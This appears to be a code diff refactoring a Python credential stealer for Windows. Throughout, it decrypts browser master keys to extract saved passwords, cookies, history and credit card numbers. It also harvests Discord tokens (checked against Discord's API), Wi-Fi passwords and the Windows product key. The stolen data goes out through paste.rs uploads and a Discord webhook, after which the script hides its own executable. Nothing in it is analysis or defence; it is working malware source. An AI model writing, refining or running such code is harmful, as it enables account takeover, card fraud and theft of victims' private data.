@@ -1,20 +1,20 @@
-import os, sys, json, base64, urllib.request, urllib.parse, re, ctypes, subprocess, sqlite3, shutil, random, uuid, platform
+import os, sys, json, base64, urllib.request, re, ctypes, subprocess, sqlite3, shutil, uuid, platform, threading
 from datetime import datetime
-from pathlib import Path
 
-if os.name != "nt":
-    sys.exit(0)
-else:
+if os.name == "nt":
     import win32crypt
-    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-    from cryptography.hazmat.backends import default_backend
-    import win32api
-    import win32con
+    from Crypto.Cipher import AES
+else:
+    sys.exit(0)
+
+try:
+    import requests
+except ImportError:
+    pass
 
 LOCAL = os.getenv("LOCALAPPDATA", "")
 ROAMING = os.getenv("APPDATA", "")
 TEMP = os.getenv("TEMP", "")
-
 WEBHOOK = "WEBHOOK_URL"
 
 PATHS = {
@@ -51,157 +51,152 @@ BROWSERS = {
 
 PROFILES = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
 
-def run_cmd(cmd):
+
+def rc(cmd):
     try:
-        result = subprocess.run(cmd, capture_output=True, text=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        return result.stdout.strip()
+        return subprocess.run(cmd, capture_output=True, text=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip()
     except:
         return "unknown"
 
-def get_hwid():
+def gk(path):
     try:
-        return run_cmd('wmic csproduct get uuid /value').replace('UUID=', '').replace('\n', '').strip()
+        with open(path + "\\Local State", "r", encoding='utf-8', errors='ignore') as f:
+            k = json.load(f)['os_crypt']['encrypted_key']
+        return win32crypt.CryptUnprotectData(base64.b64decode(k)[5:], None, None, None, 0)[1]
     except:
-        return str(uuid.uuid4())
+        return None
 
-def get_mac():
+def dc(buff, key):
     try:
-        for line in os.popen('ipconfig /all'):
-            if 'Physical Address' in line:
-                return line.split(':')[1].strip()
+        if not isinstance(buff, (bytes, bytearray)):
+            buff = bytes(buff)
+        if len(buff) < 19:
+            return ""
+        if len(buff) >= 31:
+            cipher = AES.new(key, AES.MODE_GCM, nonce=buff[3:15])
+            return cipher.decrypt(buff[15:-16]).decode('utf-8', errors='ignore')
+        return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8', errors='ignore')
+    except Exception:
+        return ""
+
+def ip():
+    try:
+        return json.loads(urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5).read().decode()).get("ip", "unknown")
+    except:
+        return "unknown"
+
+def sanitize_paste(text):
+    result = []
+    for c in text:
+        o = ord(c)
+        if o < 32 and c not in '\t\n\r':
+            result.append('�')
+        elif 127 <= o <= 159:
+            result.append('�')
+        else:
+            result.append(c)
+    return ''.join(result)
+
+def upload_paste(content):
+    try:
+        clean = sanitize_paste(content)
+        resp = requests.post(
+            'https://paste.rs/',
+            data=clean.encode('utf-8'),
+            headers={'Content-Type': 'text/plain; charset=utf-8'},
+            timeout=60
+        )
+        if resp.status_code == 201:
+            return resp.text.strip()
+        return None
+    except:
+        return None
+
+def copy_db(src, dst):
+    try:
+        shutil.copy2(src, dst)
+        for ext in ['-wal', '-shm']:
+            wal = src + ext
+            if os.path.exists(wal):
+                shutil.copy2(wal, dst + ext)
+        return True
+    except:
+        return False
+
+def rm_temp(path):
+    for ext in ['', '-wal', '-shm']:
+        fp = path + ext
+        if os.path.exists(fp):
+            try:
+                os.remove(fp)
+            except:
+                pass
+
+def sysinfo():
+    try:
+        ram = str(round(int(rc('wmic computersystem get totalphysicalmemory /value').replace('TotalPhysicalMemory=', '').strip()) / (1024**3), 2)) + " GB"
+    except:
+        ram = "unknown"
+    try:
+        u32 = ctypes.windll.user32
+        scr = f"{u32.GetSystemMetrics(0)}x{u32.GetSystemMetrics(1)}"
+    except:
+        scr = "unknown"
+    wif = {}
+    try:
+        for ln in rc('netsh wlan show profiles').split('\n'):
+            if 'Profile' in ln and ':' in ln:
+                p = ln.split(':')[1].strip()
+                if p:
+                    for ln2 in rc(f'netsh wlan show profile name="{p}" key=clear').split('\n'):
+                        if 'Key Content' in ln2:
+                            wif[p] = ln2.split(':')[1].strip() if ':' in ln2 else ''
     except:
         pass
-    return "unknown"
-
-def get_gpu():
+    av = rc('powershell -Command "Get-WmiObject -Namespace \'Root\\SecurityCenter2\' -Class AntivirusProduct | Select-Object displayName"')
+    lines = [l.strip() for l in av.split('\n') if l.strip() and 'displayName' not in l and '---' not in l]
+    av = ', '.join(lines) if lines else "Windows Defender / None"
+    mac = ""
     try:
-        return run_cmd('wmic path win32_VideoController get name /value').replace('Name=', '').strip()
-    except:
-        return "unknown"
-
-def get_cpu():
-    try:
-        return run_cmd('wmic cpu get name /value').replace('Name=', '').strip()
-    except:
-        return platform.processor()
-
-def get_ram():
-    try:
-        ram = run_cmd('wmic computersystem get totalphysicalmemory /value').replace('TotalPhysicalMemory=', '').strip()
-        return str(round(int(ram) / (1024**3), 2)) + " GB"
-    except:
-        return "unknown"
-
-def get_screen_res():
-    try:
-        user32 = ctypes.windll.user32
-        return f"{user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}"
-    except:
-        return "unknown"
-
-def get_windows_key():
-    try:
-        return run_cmd('wmic path softwarelicensingservice get OA3xOriginalProductKey /value').replace('OA3xOriginalProductKey=', '').strip()
-    except:
-        return "unknown"
-
-def get_antivirus():
-    try:
-        result = run_cmd('powershell -Command "Get-WmiObject -Namespace \'Root\\SecurityCenter2\' -Class AntivirusProduct | Select-Object displayName"')
-        lines = [l.strip() for l in result.split('\n') if l.strip() and 'displayName' not in l and '---' not in l]
-        return ', '.join(lines) if lines else "Windows Defender / None"
-    except:
-        return "unknown"
-
-def get_wifi_passwords():
-    networks = {}
-    try:
-        profiles = run_cmd('netsh wlan show profiles')
-        for line in profiles.split('\n'):
-            if 'Profile' in line and ':' in line:
-                profile = line.split(':')[1].strip()
-                if profile:
-                    info = run_cmd(f'netsh wlan show profile name="{profile}" key=clear')
-                    for line2 in info.split('\n'):
-                        if 'Key Content' in line2:
-                            pwd = line2.split(':')[1].strip() if ':' in line2 else ''
-                            networks[profile] = pwd
+        for ln in os.popen('ipconfig /all'):
+            if 'Physical Address' in ln:
+                mac = ln.split(':')[1].strip()
+                break
     except:
         pass
-    return networks
-
-def get_system_info():
+    hwid = rc('wmic csproduct get uuid /value').replace('UUID=', '').strip()
     return {
         "username": os.getenv("USERNAME", "unknown"),
         "hostname": os.getenv("COMPUTERNAME", "unknown"),
-        "hwid": get_hwid(),
-        "uuid": run_cmd('wmic csproduct get uuid /value').replace('UUID=', '').strip(),
-        "mac": get_mac(),
-        "ip": get_ip(),
-        "cpu": get_cpu(),
-        "gpu": get_gpu(),
-        "ram": get_ram(),
-        "screen": get_screen_res(),
+        "hwid": hwid if hwid else str(uuid.uuid4()),
+        "uuid": hwid if hwid else str(uuid.uuid4()),
+        "mac": mac,
+        "ip": ip(),
+        "cpu": rc('wmic cpu get name /value').replace('Name=', '').strip(),
+        "gpu": rc('wmic path win32_VideoController get name /value').replace('Name=', '').strip(),
+        "ram": ram,
+        "screen": scr,
         "os": platform.platform(),
-        "windows_key": get_windows_key(),
-        "antivirus": get_antivirus(),
-        "wifi_networks": get_wifi_passwords(),
+        "windows_key": rc('wmic path softwarelicensingservice get OA3xOriginalProductKey /value').replace('OA3xOriginalProductKey=', '').strip(),
+        "antivirus": av,
+        "wifi_passwords": wif,
         "time": datetime.now().isoformat()
     }
 
-def upload_gofile(content, filename):
-    """Upload content to Gofile and return download link"""
-    try:
-        temp_path = os.path.join(TEMP, filename)
-        with open(temp_path, 'w', encoding='utf-8') as f:
-            f.write(content)
-        
-        # Get available server
-        req = urllib.request.Request(
-            'https://api.gofile.io/getServer',
-            headers={'User-Agent': 'Mozilla/5.0'}
-        )
-        with urllib.request.urlopen(req, timeout=10) as response:
-            server_data = json.loads(response.read().decode())
-            server = server_data['data']['server']
-        
-        # Upload file
-        boundary = '----WebKitFormBoundary' + ''.join(random.choice('0123456789abcdef') for _ in range(16))
-        
-        with open(temp_path, 'rb') as f:
-            file_data = f.read()
-        
-        body = []
-        body.append(f'--{boundary}')
-        body.append(f'Content-Disposition: form-data; name="file"; filename="{filename}"')
-        body.append('Content-Type: text/plain')
-        body.append('')
-        body.append(file_data.decode('utf-8', errors='ignore'))
-        body.append(f'--{boundary}--')
-        body.append('')
-        
-        body_bytes = '\r\n'.join(body).encode('utf-8', errors='ignore')
-        
-        upload_req = urllib.request.Request(
-            f'https://{server}.gofile.io/uploadFile',
-            data=body_bytes,
-            headers={
-                'Content-Type': f'multipart/form-data; boundary={boundary}',
-                'User-Agent': 'Mozilla/5.0'
-            },
-            method='POST'
-        )
-        
-        with urllib.request.urlopen(upload_req, timeout=60) as response:
-            upload_data = json.loads(response.read().decode())
-            code = upload_data['data']['code']
-            link = f"https://gofile.io/d/{code}"
-        
-        os.remove(temp_path)
-        return link
-        
-    except:
-        return None
+def get_tokens(path):
+    tks, ldb_path = [], path + "\\Local Storage\\leveldb\\"
+    if not os.path.exists(ldb_path):
+        return tks
+    for fl in os.listdir(ldb_path):
+        if not fl.endswith((".ldb", ".log")):
+            continue
+        try:
+            with open(f"{ldb_path}{fl}", "r", errors="ignore") as f:
+                for m in re.findall(r"dQw4w9WgXcQ:[^\"\\s]*", f.read()):
+                    tks.append(m)
+        except:
+            continue
+    return tks
 
 def cleanup():
     try:
@@ -214,241 +209,223 @@ def cleanup():
     except:
         pass
 
-def getkey(path):
-    try:
-        with open(path + "\\Local State", "r", encoding='utf-8', errors='ignore') as f:
-            return json.loads(f.read())['os_crypt']['encrypted_key']
-    except:
-        return None
 
-def gettokens(path):
-    tokens = []
-    ldb_path = path + "\\Local Storage\\leveldb\\"
-    if not os.path.exists(ldb_path):
-        return tokens
-    for file in os.listdir(ldb_path):
-        if not file.endswith((".ldb", ".log")):
-            continue
+class BrowserExtractor:
+    def __init__(self):
+        self.browsers = BROWSERS
+        self.profiles = PROFILES
+        self.out_dir = os.path.join(TEMP, "Browser_" + uuid.uuid4().hex[:8])
+        os.makedirs(self.out_dir, exist_ok=True)
+        self.masterkey = None
+        self.data = {}
+
+    def get_master_key(self, path: str) -> bytes:
         try:
-            with open(f"{ldb_path}{file}", "r", errors="ignore") as f:
-                content = f.read()
-                for match in re.findall(r"dQw4w9WgXcQ:[^\"\\s]*", content):
-                    tokens.append(match)
-        except:
-            continue
-    return tokens
+            with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                c = f.read()
+            local_state = json.loads(c)
+            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            master_key = master_key[5:]
+            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+            return master_key
+        except Exception:
+            return None
 
-def decrypt_token(encrypted_token, key):
-    try:
-        encrypted = base64.b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1])
-        decrypted_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
-        
-        # Using cryptography instead of pycryptodome
-        iv = encrypted[3:15]
-        ciphertext = encrypted[15:-16]
-        tag = encrypted[-16:]
-        
-        cipher = Cipher(algorithms.AES(decrypted_key), modes.GCM(iv, tag), backend=default_backend())
-        decryptor = cipher.decryptor()
-        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
-        return decrypted.decode('utf-8')
-    except:
+    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
+        try:
+            if not isinstance(buff, (bytes, bytearray)):
+                buff = bytes(buff)
+            if len(buff) < 19:
+                return ""
+            if len(buff) >= 31:
+                iv = buff[3:15]
+                payload = buff[15:]
+                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                decrypted = cipher.decrypt(payload)
+                return decrypted[:-16].decode('utf-8', errors='ignore')
+            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8', errors='ignore')
+        except Exception:
+            return ""
+
+    def _create_temp_copy(self, src: str) -> str:
+        dst = os.path.join(self.out_dir, f"tmp_{uuid.uuid4().hex}.db")
+        if copy_db(src, dst):
+            return dst
         return None
 
-def get_ip():
-    try:
-        with urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5) as r:
-            return json.loads(r.read().decode()).get("ip", "unknown")
-    except:
-        return "unknown"
+    def _ensure_browser(self, name):
+        if name not in self.data:
+            self.data[name] = {"passwords": "", "cookies": "", "history": "", "credit_cards": ""}
 
-def get_browser_master_key(path):
-    try:
-        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
-            local_state = json.load(f)
-        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        master_key = master_key[5:]
-        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-    except:
-        return None
+    def passwords(self, name: str, path: str, profile: str):
+        try:
+            if name in ['opera', 'opera-gx']:
+                login_path = os.path.join(path, 'Login Data')
+            else:
+                login_path = os.path.join(path, profile, 'Login Data')
+            if not os.path.isfile(login_path):
+                return
+            tdb = self._create_temp_copy(login_path)
+            if not tdb:
+                return
+            conn = sqlite3.connect(tdb)
+            cursor = conn.cursor()
+            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+            self._ensure_browser(name)
+            for row in cursor.fetchall():
+                url, username, encrypted_pass = row
+                if url and username and encrypted_pass:
+                    password = self.decrypt_val(encrypted_pass, self.masterkey)
+                    if password:
+                        self.data[name]["passwords"] += f"[{name}/{profile}] {url} | {username}:{password}\n"
+            cursor.close()
+            conn.close()
+            rm_temp(tdb)
+        except Exception:
+            pass
 
-def decrypt_browser_data(buff, master_key):
-    try:
-        # Using cryptography instead of pycryptodome
-        iv = buff[3:15]
-        ciphertext = buff[15:-16]
-        tag = buff[-16:]
-        
-        cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag), backend=default_backend())
-        decryptor = cipher.decryptor()
-        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
-        return decrypted.decode('utf-8')
-    except:
-        return ""
+    def cookies(self, name: str, path: str, profile: str):
+        try:
+            if name in ['opera', 'opera-gx']:
+                cookie_path = os.path.join(path, 'Network', 'Cookies')
+            else:
+                cookie_path = os.path.join(path, profile, 'Network', 'Cookies')
+            if not os.path.isfile(cookie_path):
+                return
+            tdb = self._create_temp_copy(cookie_path)
+            if not tdb:
+                return
+            conn = sqlite3.connect(tdb)
+            cursor = conn.cursor()
+            cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
+            self._ensure_browser(name)
+            for row in cursor.fetchall():
+                host, cname, cpath, encrypted_value, expires = row
+                value = self.decrypt_val(encrypted_value, self.masterkey)
+                if host and cname and value:
+                    self.data[name]["cookies"] += f"{host}\t{'FALSE' if expires == 0 else 'TRUE'}\t{cpath}\t{'FALSE' if host.startswith('.') else 'TRUE'}\t{expires}\t{cname}\t{value}\n"
+            cursor.close()
+            conn.close()
+            rm_temp(tdb)
+        except Exception:
+            pass
 
-def extract_browser_data():
-    results = {"passwords": "", "cookies": "", "history": ""}
-    gofile_links = {}
-    
-    for name, path in BROWSERS.items():
-        if not os.path.isdir(path):
-            continue
-            
-        master_key = get_browser_master_key(path)
-        if not master_key:
-            continue
-            
-        for profile in PROFILES:
-            profile_path = path if name in ['opera', 'opera-gx'] else os.path.join(path, profile)
-            
-            # passwords
+    def history(self, name: str, path: str, profile: str):
+        try:
+            if name in ['opera', 'opera-gx']:
+                hist_path = os.path.join(path, 'History')
+            else:
+                hist_path = os.path.join(path, profile, 'History')
+            if not os.path.isfile(hist_path):
+                return
+            tdb = self._create_temp_copy(hist_path)
+            if not tdb:
+                return
+            conn = sqlite3.connect(tdb)
+            cursor = conn.cursor()
+            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
+            self._ensure_browser(name)
+            for row in cursor.fetchall():
+                url, title, visits, last_visit = row
+                if url:
+                    self.data[name]["history"] += f"[{name}/{profile}] {title} | {url} (Visits: {visits})\n"
+            cursor.close()
+            conn.close()
+            rm_temp(tdb)
+        except Exception:
+            pass
+
+    def credit_cards(self, name: str, path: str, profile: str):
+        try:
+            if name in ['opera', 'opera-gx']:
+                webdata_path = os.path.join(path, 'Web Data')
+            else:
+                webdata_path = os.path.join(path, profile, 'Web Data')
+            if not os.path.isfile(webdata_path):
+                return
+            tdb = self._create_temp_copy(webdata_path)
+            if not tdb:
+                return
+            conn = sqlite3.connect(tdb)
+            cursor = conn.cursor()
+            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+            self._ensure_browser(name)
+            for row in cursor.fetchall():
+                name_on_card, exp_month, exp_year, encrypted_num = row
+                if encrypted_num:
+                    card_num = self.decrypt_val(encrypted_num, self.masterkey)
+                    if card_num:
+                        self.data[name]["credit_cards"] += f"[{name}/{profile}] {name_on_card} | {exp_month}/{exp_year} | {card_num}\n"
+            cursor.close()
+            conn.close()
+            rm_temp(tdb)
+        except Exception:
+            pass
+
+    def extract(self):
+        def run_func(name, path, profile, func):
             try:
-                login_db = os.path.join(profile_path, 'Login Data')
-                if os.path.exists(login_db):
-                    temp_db = os.path.join(TEMP, f"{name}_{profile}_login.db")
-                    shutil.copy2(login_db, temp_db)
-                    conn = sqlite3.connect(temp_db)
-                    cursor = conn.cursor()
-                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
-                    
-                    for row in cursor.fetchall():
-                        url, username, encrypted_pass = row
-                        if url and username and encrypted_pass:
-                            password = decrypt_browser_data(encrypted_pass, master_key)
-                            if password:
-                                results["passwords"] += f"[{name}/{profile}] {url} | {username}:{password}\n"
-                    
-                    cursor.close()
-                    conn.close()
-                    os.remove(temp_db)
-            except:
+                func(name, path, profile)
+            except Exception:
                 pass
-            
-            # cookies
-            try:
-                cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
-                if os.path.exists(cookie_db):
-                    temp_db = os.path.join(TEMP, f"{name}_{profile}_cookies.db")
-                    shutil.copy2(cookie_db, temp_db)
-                    conn = sqlite3.connect(temp_db)
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
-                    
-                    for row in cursor.fetchall():
-                        host, cname, cpath, encrypted_value, expires = row
-                        value = decrypt_browser_data(encrypted_value, master_key)
-                        if host and cname and value:
-                            results["cookies"] += f"{host}\t{'FALSE' if expires == 0 else 'TRUE'}\t{cpath}\t{'FALSE' if host.startswith('.') else 'TRUE'}\t{expires}\t{cname}\t{value}\n"
-                    
-                    cursor.close()
-                    conn.close()
-                    os.remove(temp_db)
-            except:
-                pass
-            
-            # history
-            try:
-                history_db = os.path.join(profile_path, 'History')
-                if os.path.exists(history_db):
-                    temp_db = os.path.join(TEMP, f"{name}_{profile}_history.db")
-                    shutil.copy2(history_db, temp_db)
-                    conn = sqlite3.connect(temp_db)
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
-                    
-                    for row in cursor.fetchall():
-                        url, title, visits, last_visit = row
-                        if url:
-                            results["history"] += f"[{name}/{profile}] {title} | {url} (Visits: {visits})\n"
-                    
-                    cursor.close()
-                    conn.close()
-                    os.remove(temp_db)
-            except:
-                pass
-    
-    # Upload to Gofile
-    if results["passwords"]:
-        link = upload_gofile(results["passwords"], "passwords.txt")
-        if link:
-            gofile_links["passwords"] = link
-    
-    if results["cookies"]:
-        link = upload_gofile(results["cookies"], "cookies.txt")
-        if link:
-            gofile_links["cookies"] = link
-            
-    if results["history"]:
-        link = upload_gofile(results["history"], "history.txt")
-        if link:
-            gofile_links["history"] = link
-    
-    return gofile_links
 
-def send_webhook(data, hostname):
-    try:
-        json_str = json.dumps(data)
-        encoded = base64.b64encode(json_str.encode()).decode()
-        
-        message = f"{hostname} @everyone\n`{encoded}`"
-        
-        payload = json.dumps({
-            "content": message
-        })
-        
-        req = urllib.request.Request(
-            WEBHOOK,
-            data=payload.encode(),
-            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
-            method='POST'
-        )
-        urllib.request.urlopen(req, timeout=10)
-            
-    except:
-        pass
+        for name, path in self.browsers.items():
+            if not os.path.isdir(path):
+                continue
+            local_state = os.path.join(path, 'Local State')
+            if not os.path.isfile(local_state):
+                continue
+            self.masterkey = self.get_master_key(local_state)
+            if not self.masterkey:
+                continue
+
+            funcs = [self.passwords, self.cookies, self.history, self.credit_cards]
+            threads = []
+            for profile in self.profiles:
+                profile_path = path if name in ['opera', 'opera-gx'] else os.path.join(path, profile)
+                if not os.path.isdir(profile_path):
+                    continue
+                for func in funcs:
+                    t = threading.Thread(target=run_func, args=(name, path, profile, func))
+                    t.start()
+                    threads.append(t)
+
+            for t in threads:
+                t.join()
+
+        return self.data
+
 
 def main():
-    checked = []
-    results = {
-        "system": get_system_info(),
-        "discord": [],
-        "browser_data": {}
-    }
-    
+    checked, results = [], {"system": sysinfo(), "discord": [], "browser_data": {}}
     hostname = os.getenv("COMPUTERNAME", "UNKNOWN_PC")
     
-    # get tokens
-    for platform, path in PATHS.items():
+    for plat, path in PATHS.items():
         if not os.path.exists(path):
             continue
-            
-        key = getkey(path)
+        key = gk(path)
         if not key:
             continue
-            
-        for token in gettokens(path):
+        for token in get_tokens(path):
             token = token.rstrip("\\")
-            decrypted = decrypt_token(token, key)
+            try:
+                enc = base64.b64decode(token.split('dQw4w9WgXcQ:')[1])
+            except:
+                continue
+            decrypted = dc(enc, key)
             if not decrypted or decrypted in checked:
                 continue
             checked.append(decrypted)
-            
             try:
-                req = urllib.request.Request(
-                    'https://discord.com/api/v10/users/@me',
-                    headers={"Authorization": decrypted, "User-Agent": "Mozilla/5.0"},
-                    method='GET'
-                )
-                with urllib.request.urlopen(req, timeout=5) as res:
-                    user = json.loads(res.read().decode())
-                    
+                req = urllib.request.Request('https://discord.com/api/v10/users/@me', headers={"Authorization": decrypted, "User-Agent": "Mozilla/5.0"}, method='GET')
+                user = json.loads(urllib.request.urlopen(req, timeout=5).read().decode())
                 results["discord"].append({
                     "token": decrypted,
                     "username": user.get("username", "unknown"),
                     "userid": user.get("id", "unknown"),
                     "email": user.get("email", "none"),
                     "phone": user.get("phone", "none"),
-                    "source": platform,
+                    "source": plat,
                     "verified": user.get("verified", False),
                     "mfa": user.get("mfa_enabled", False),
                     "nitro": user.get("premium_type", 0)
@@ -456,15 +433,27 @@ def main():
             except:
                 continue
     
-    results["browser_data"] = extract_browser_data()
+    extractor = BrowserExtractor()
+    raw_data = extractor.extract()
     
-    send_webhook(results, hostname)
+    for browser, categories in raw_data.items():
+        results["browser_data"][browser] = {}
+        for category, content in categories.items():
+            if content.strip():
+                link = upload_paste(content)
+                if link:
+                    results["browser_data"][browser][category] = link
+    
+    msg = f"{hostname} - {ip()} @everyone\n```json\n{json.dumps(results, indent=2)}\n```"
+    try:
+        urllib.request.urlopen(urllib.request.Request(WEBHOOK, data=json.dumps({"content": msg}).encode(), headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, method='POST'), timeout=10)
+    except:
+        pass
     
     try:
         ctypes.windll.kernel32.SetFileAttributesW(sys.executable, 2)
     except:
         pass
-        
     cleanup()
 
 if __name__ == "__main__":
